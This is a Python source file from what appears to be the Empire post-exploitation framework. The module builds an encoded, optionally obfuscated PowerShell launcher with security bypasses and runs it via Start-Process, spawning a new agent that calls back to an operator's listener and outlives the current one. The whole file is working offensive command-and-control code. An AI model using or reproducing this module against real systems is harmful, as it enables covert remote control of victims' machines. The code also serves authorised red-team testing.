from __future__ import print_function

from builtins import object, str
from typing import Dict

from empire.server.core.module_models import EmpireModule
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(
        main_menu,
        module: EmpireModule,
        params: Dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # staging options
        listener_name = params["Listener"]
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]
        sys_wow64 = params["SysWow64"]
        if (params["Obfuscate"]).lower() == "true":
            launcher_obfuscate = True
        else:
            launcher_obfuscate = False
        launcher_obfuscate_command = params["ObfuscateCommand"]

        # generate the launcher script
        launcher = main_menu.stagers.generate_launcher(
            listenerName=listener_name,
            language="powershell",
            encode=True,
            obfuscate=launcher_obfuscate,
            obfuscation_command=launcher_obfuscate_command,
            userAgent=user_agent,
            proxy=proxy,
            proxyCreds=proxy_creds,
            bypasses=params["Bypasses"],
        )

        if launcher == "":
            return handle_error_message("[!] Error in launcher command generation.")
        else:
            # transform the backdoor into something launched by powershell.exe
            # so it survives the agent exiting
            if sys_wow64.lower() == "true":
                stager_code = (
                    "$Env:SystemRoot\\SysWow64\\WindowsPowershell\\v1.0\\" + launcher
                )
            else:
                stager_code = (
                    "$Env:SystemRoot\\System32\\WindowsPowershell\\v1.0\\" + launcher
                )

            parts = stager_code.split(" ")

            script = (
                "Start-Process -NoNewWindow -FilePath \"%s\" -ArgumentList '%s'; 'Agent spawned to %s'"
                % (parts[0], " ".join(parts[1:]), listener_name)
            )

        script = main_menu.modulesv2.finalize_module(
            script=script,
            script_end="",
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
        return script
